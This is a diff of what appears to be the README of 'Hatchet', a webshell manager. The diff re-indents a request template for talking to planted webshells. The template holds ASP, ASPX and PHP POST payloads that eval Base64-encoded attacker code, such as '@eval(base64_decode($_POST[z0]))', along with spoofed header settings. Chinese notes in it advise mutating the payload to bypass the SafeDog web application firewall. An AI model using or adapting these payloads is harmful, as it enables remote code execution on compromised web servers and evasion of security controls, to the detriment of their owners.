@@ -49,37 +49,38 @@ Hatchet VS2005完整源码
 	SHA1: A1B598CB4EB47554E6F191A7EB33111F462C77FD
 	CRC32: C094BD42
 
-/*
-	[Header]
-	User-Agent=Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
-	Referer=1
-	X-Forwarded-For=1
-	[/Header]
-	[Headers]
-	Accept-Language: en-us
-	Content-Type: application/x-www-form-urlencoded
-	[/Headers]
-	[POST]
-	ASP_POST_DATA==Execute("Execute(""On+Error+Resume+Next:Response.Clear:
+、、、
+	/*
+		[Header]
+		User-Agent=Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
+		Referer=1
+		X-Forwarded-For=1
+		[/Header]
+		[Headers]
+		Accept-Language: en-us
+		Content-Type: application/x-www-form-urlencoded
+		[/Headers]
+		[POST]
+		ASP_POST_DATA==Execute("Execute(""On+Error+Resume+Next:Response.Clear:
 
-	ASPX_POST_DATA==Response.Write("->|");var err:Exception;try{eval(System.Text.Encoding.GetEncoding(%nPageCode%).GetString(System.Convert.FromBase64String("%szBase64EvalCode%")),"unsafe");}catch(err){Response.Write("ERROR:// "%2Berr.message);}Response.Write("|<-");Response.End();
+		ASPX_POST_DATA==Response.Write("->|");var err:Exception;try{eval(System.Text.Encoding.GetEncoding(%nPageCode%).GetString(System.Convert.FromBase64String("%szBase64EvalCode%")),"unsafe");}catch(err){Response.Write("ERROR:// "%2Berr.message);}Response.Write("|<-");Response.End();
 
-	PHP_POST_DATA==@eval(base64_decode($_POST[z0]));&z0=
+		PHP_POST_DATA==@eval(base64_decode($_POST[z0]));&z0=
 
-	PHP_POST_Z0_DATA=@ini_set("display_errors","0");@set_time_limit(0);@set_magic_quotes_runtime(0);
-	[/POST]
+		PHP_POST_Z0_DATA=@ini_set("display_errors","0");@set_time_limit(0);@set_magic_quotes_runtime(0);
+		[/POST]
 
-	##################################################
-	#以下是说明
-	请严格保持该格式，大小写不一样
-	Referer 为1 则程序自动添加
-	X-Forwarded-For 为1 则程序自动随机生成添加
-	如果要自己手动添加其固定值，请设为0，后在[Headers]里添加即可。
-	[POST]里为POST的部分数据，可自行变异这段代码，过安全狗等，很灵活的哦～
-	%nPageCode% 为程序需要处理的编码，请保留
-	%szBase64EvalCode% 为程序需要处理的执行代码，请保留
-*/
-
+		##################################################
+		#以下是说明
+		请严格保持该格式，大小写不一样
+		Referer 为1 则程序自动添加
+		X-Forwarded-For 为1 则程序自动随机生成添加
+		如果要自己手动添加其固定值，请设为0，后在[Headers]里添加即可。
+		[POST]里为POST的部分数据，可自行变异这段代码，过安全狗等，很灵活的哦～
+		%nPageCode% 为程序需要处理的编码，请保留
+		%szBase64EvalCode% 为程序需要处理的执行代码，请保留
+	*/
+、、、
 ------------------------------------------------------------
 2013.12.03
 *	本地数据库单引号
